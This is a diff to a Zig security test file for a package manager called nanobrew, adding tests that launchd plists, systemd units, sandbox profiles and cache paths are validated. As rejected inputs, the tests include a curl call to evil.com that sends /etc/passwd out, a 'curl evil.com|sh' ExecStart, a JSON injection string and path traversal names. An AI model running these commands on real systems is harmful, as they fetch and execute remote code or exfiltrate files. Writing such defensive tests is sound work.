@@ -4,6 +4,7 @@
 // attack vectors against nanobrew's defensive functions.
 
 const std = @import("std");
+const builtin = @import("builtin");
 const testing = std.testing;
 
 // Import the modules under test
@@ -14,22 +15,12 @@ const placeholder = @import("platform/placeholder.zig");
 const store = @import("store/store.zig");
 const client = @import("api/client.zig");
 
-/// Minimal anytype-compatible writer for tests — writes into a fixed stack buffer.
-const TestBufWriter = struct {
-    buf: [20480]u8 = undefined,
-    pos: usize = 0,
-    pub fn writeAll(self: *@This(), bytes: []const u8) anyerror!void {
-        @memcpy(self.buf[self.pos..][0..bytes.len], bytes);
-        self.pos += bytes.len;
-    }
-    pub fn written(self: *const @This()) []const u8 {
-        return self.buf[0..self.pos];
-    }
-    pub fn reset(self: *@This()) void {
-        self.pos = 0;
-    }
-};
 
+
+const postinstall = @import("build/postinstall.zig");
+const launchd = @import("services/launchd.zig");
+const sandbox = @import("build/sandbox.zig");
+const formula_cache = @import("build/formula_cache.zig");
 // ────────────────────────────────────────────────────────────────────────
 // 1. Path traversal in package names
 // ────────────────────────────────────────────────────────────────────────
@@ -60,16 +51,21 @@ test "package name with single dot components is safe" {
 
 test "writeJsonEscaped handles null bytes" {
     var w: TestBufWriter = .{};
+    _ = &w;
+
     // Null byte must be escaped as \u0000, never passed through raw
     Database.writeJsonEscaped(&w, "before\x00after");
     const result = w.written();
     try testing.expectEqualStrings("before\\u0000after", result);
+
     // Verify no raw null byte exists in output
     try testing.expect(std.mem.indexOf(u8, result, &[_]u8{0}) == null);
 }
 
 test "writeJsonEscaped handles string of only null bytes" {
     var w: TestBufWriter = .{};
+    _ = &w;
+
     Database.writeJsonEscaped(&w, "\x00\x00\x00");
     try testing.expectEqualStrings("\\u0000\\u0000\\u0000", w.written());
 }
@@ -89,6 +85,8 @@ test "writeJsonEscaped handles very long input" {
     // 10KB of input data — must not crash or overflow
     const input = "A" ** 10240;
     var w: TestBufWriter = .{};
+    _ = &w;
+
     Database.writeJsonEscaped(&w, input);
     try testing.expectEqual(@as(usize, 10240), w.written().len);
 }
@@ -98,6 +96,8 @@ test "writeJsonEscaped handles long input with many escapes" {
     const input = "\x01" ** 1024;
     // Each \x01 becomes \u0001 (6 chars), so we need 6 * 1024 = 6144 bytes
     var w: TestBufWriter = .{};
+    _ = &w;
+
     Database.writeJsonEscaped(&w, input);
     try testing.expectEqual(@as(usize, 6144), w.written().len);
 }
@@ -198,12 +198,16 @@ test "placeholder replacement does not crash on very long input" {
 
 test "writeJsonEscaped blocks nested JSON injection" {
     var w: TestBufWriter = .{};
+    _ = &w;
+
     // Classic JSON injection: try to break out of a string value and inject new keys
     const payload = "name\",\"admin\":true,\"x\":\"";
     Database.writeJsonEscaped(&w, payload);
     const result = w.written();
+
     // ALL double quotes in the payload must be escaped
     try testing.expectEqualStrings("name\\\",\\\"admin\\\":true,\\\"x\\\":\\\"", result);
+
     // Verify every double quote in the output is preceded by a backslash
     for (result, 0..) |c, i| {
         if (c == '"') {
@@ -215,13 +219,17 @@ test "writeJsonEscaped blocks nested JSON injection" {
 
 test "writeJsonEscaped handles all control characters u0000-u001f" {
     var w: TestBufWriter = .{};
+    _ = &w;
+
     // Feed all 32 control characters (0x00 through 0x1F)
     var input: [32]u8 = undefined;
     for (0..32) |i| {
         input[i] = @intCast(i);
     }
+
     Database.writeJsonEscaped(&w, &input);
     const result = w.written();
+
     // No raw control character should appear in the output
     for (result) |c| {
         try testing.expect(c >= 0x20);
@@ -230,6 +238,8 @@ test "writeJsonEscaped handles all control characters u0000-u001f" {
 
 test "writeJsonEscaped handles backslash-quote combo attack" {
     var w: TestBufWriter = .{};
+    _ = &w;
+
     // Attack: \" — if only the quote is escaped but not the backslash,
     // the resulting \\" would end the string
     Database.writeJsonEscaped(&w, "\\\"");
@@ -238,6 +248,8 @@ test "writeJsonEscaped handles backslash-quote combo attack" {
 
 test "writeJsonString wraps in quotes and escapes content" {
     var w: TestBufWriter = .{};
+    _ = &w;
+
     Database.writeJsonString(&w, "hello\nworld");
     try testing.expectEqualStrings("\"hello\\nworld\"", w.written());
 }
@@ -322,19 +334,6 @@ test "tar extraction strips setuid and setgid bits from mode" {
     try testing.expectEqual(@as(u32, 0o0755), raw_mode3 & 0o0777);
 }
 
-// ────────────────────────────────────────────────────────────────────────
-// 11. HTTPS enforcement for API and bottle domain env var overrides
-// ────────────────────────────────────────────────────────────────────────
-
-test "isValidDomainOverride rejects non-HTTPS URLs" {
-    try testing.expect(!client.isValidDomainOverride("http://evil.com/api/"));
-    try testing.expect(!client.isValidDomainOverride("ftp://evil.com/"));
-    try testing.expect(!client.isValidDomainOverride("javascript:alert(1)"));
-    try testing.expect(!client.isValidDomainOverride(""));
-    try testing.expect(!client.isValidDomainOverride("file:///etc/passwd"));
-    try testing.expect(client.isValidDomainOverride("https://formulae.brew.sh/api/formula/"));
-    try testing.expect(client.isValidDomainOverride("https://my-mirror.example.com/"));
-}
 
 // ────────────────────────────────────────────────────────────────────────
 // 9. SHA256 validation in store paths
@@ -346,4 +345,225 @@ test "isValidSha256 rejects non-hex strings" {
     try testing.expect(!store.isValidSha256("abc"));
     try testing.expect(!store.isValidSha256("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"));
     try testing.expect(store.isValidSha256("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"));
+}
+
+
+
+// 11. HTTPS enforcement for API and bottle domain env var overrides
+// ────────────────────────────────────────────────────────────────────────
+
+test "isValidDomainOverride rejects non-HTTPS URLs" {
+    try testing.expect(!client.isValidDomainOverride("http://evil.com/api/"));
+    try testing.expect(!client.isValidDomainOverride("ftp://evil.com/"));
+    try testing.expect(!client.isValidDomainOverride("javascript:alert(1)"));
+    try testing.expect(!client.isValidDomainOverride(""));
+    try testing.expect(!client.isValidDomainOverride("file:///etc/passwd"));
+    // Valid
+    try testing.expect(client.isValidDomainOverride("https://formulae.brew.sh/api/formula/"));
+    try testing.expect(client.isValidDomainOverride("https://my-mirror.example.com/"));
+}
+
+// ────────────────────────────────────────────────────────────────────────
+// 12. Launchd plist content validation
+// ────────────────────────────────────────────────────────────────────────
+
+test "isPlistSafe rejects plist with UserName root" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>UserName</key>
+        \\  <string>root</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/opt/nanobrew/prefix/Cellar/evil/1.0/bin/evil</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe rejects plist with ProgramArguments outside keg" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/usr/bin/curl</string>
+        \\    <string>http://evil.com/steal?data=/etc/passwd</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe accepts safe plist with ProgramArguments inside keg" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.redis</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/bin/redis-server</string>
+        \\    <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/etc/redis.conf</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+// ────────────────────────────────────────────────────────────────────────
+// 13. systemd service file validation
+// ────────────────────────────────────────────────────────────────────────
+
+const systemd = @import("services/systemd.zig");
+
+const TestBufWriter = struct {
+    buf: [20480]u8 = undefined,
+    pos: usize = 0,
+    pub fn writeAll(self: *@This(), bytes: []const u8) anyerror!void {
+        @memcpy(self.buf[self.pos..][0..bytes.len], bytes);
+        self.pos += bytes.len;
+    }
+    pub fn written(self: *const @This()) []const u8 {
+        return self.buf[0..self.pos];
+    }
+    pub fn reset(self: *@This()) void {
+        self.pos = 0;
+    }
+};
+
+
+test "isServiceFileSafe rejects User=root" {
+    const content =
+        \\[Unit]
+        \\Description=Evil Service
+        \\
+        \\[Service]
+        \\User=root
+        \\ExecStart=/opt/nanobrew/prefix/Cellar/pkg/1.0/bin/mybin
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isServiceFileSafe rejects ExecStart outside keg" {
+    const content =
+        \\[Unit]
+        \\Description=Malicious Service
+        \\
+        \\[Service]
+        \\ExecStart=/bin/bash -c 'curl evil.com|sh'
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isServiceFileSafe accepts safe service file with ExecStart inside keg" {
+    const content =
+        \\[Unit]
+        \\Description=Safe Service
+        \\
+        \\[Service]
+        \\User=_myservice
+        \\ExecStart=/opt/nanobrew/prefix/Cellar/mypkg/1.0/bin/mypkg --config /etc/mypkg.conf
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "database MAX_DB_SIZE is larger than old 1 MiB limit" {
+    try testing.expect(Database.MAX_DB_SIZE > 1024 * 1024);
+    try testing.expectEqual(@as(usize, 16 * 1024 * 1024), Database.MAX_DB_SIZE);
+}
+
+// ────────────────────────────────────────────────────────────────────────
+// 14. Sandbox profile generation
+// ────────────────────────────────────────────────────────────────────────
+
+test "sandbox profile contains keg path and no unreplaced placeholders" {
+    const alloc = testing.allocator;
+    const keg = "/opt/nanobrew/prefix/Cellar/wget/1.24.5";
+    const profile = try sandbox.generateProfile(alloc, keg);
+    defer alloc.free(profile);
+
+    // Profile must contain the keg path
+    try testing.expect(std.mem.indexOf(u8, profile, keg) != null);
+
+    // No unreplaced placeholders
+    try testing.expect(std.mem.indexOf(u8, profile, "@@KEG_PATH@@") == null);
+
+    // Contains key deny rules
+    try testing.expect(std.mem.indexOf(u8, profile, "(deny network") != null);
+    try testing.expect(std.mem.indexOf(u8, profile, "(deny default)") != null);
+}
+
+test "sandbox profile rejects keg path with shell metacharacters" {
+    const alloc = testing.allocator;
+    const result = sandbox.generateProfile(alloc, "/opt/nanobrew/\"evil");
+    try testing.expectError(error.UnsafeKegPath, result);
+}
+
+test "sandboxedArgv prepends sandbox-exec on macOS" {
+    const alloc = testing.allocator;
+    const original = &[_][]const u8{ "mkdir", "-p", "/some/path" };
+    const result = try sandbox.sandboxedArgv(alloc, original, "/opt/nanobrew/prefix/Cellar/pkg/1.0");
+    defer {
+        for (result.argv) |arg| alloc.free(@constCast(arg));
+        alloc.free(result.argv);
+        if (result.profile.len > 0) alloc.free(result.profile);
+    }
+
+    if (comptime builtin.os.tag == .macos) {
+        try testing.expectEqual(original.len + 3, result.argv.len);
+        try testing.expectEqualStrings("sandbox-exec", result.argv[0]);
+    } else {
+        try testing.expectEqual(original.len, result.argv.len);
+    }
+}
+
+
+
+// ────────────────────────────────────────────────────────────────────────
+// 15. Formula cache hash pinning
+// ────────────────────────────────────────────────────────────────────────
+
+test "formula cache hash path is derived from name and version" {
+    var buf: [512]u8 = undefined;
+    const path = formula_cache.hashPath(&buf, "wget", "1.24.5");
+    try testing.expect(std.mem.endsWith(u8, path, "wget-1.24.5.rb.sha256"));
+    try testing.expect(std.mem.startsWith(u8, path, "/opt/nanobrew/cache/formulas/"));
+}
+
+test "formula cache rejects names with path traversal" {
+    var buf: [512]u8 = undefined;
+    try testing.expectEqual(@as(usize, 0), formula_cache.hashPath(&buf, "../evil", "1.0").len);
+    try testing.expectEqual(@as(usize, 0), formula_cache.hashPath(&buf, "foo/../../bar", "1.0").len);
+}
+
+test "computeSha256Hex produces correct hex output" {
+    const input = "hello world\n";
+    var hex: [64]u8 = undefined;
+    formula_cache.computeSha256Hex(input, &hex);
+    // sha256("hello world\n") starts with a948904f
+    try testing.expect(std.mem.startsWith(u8, &hex, "a948904f"));
 }
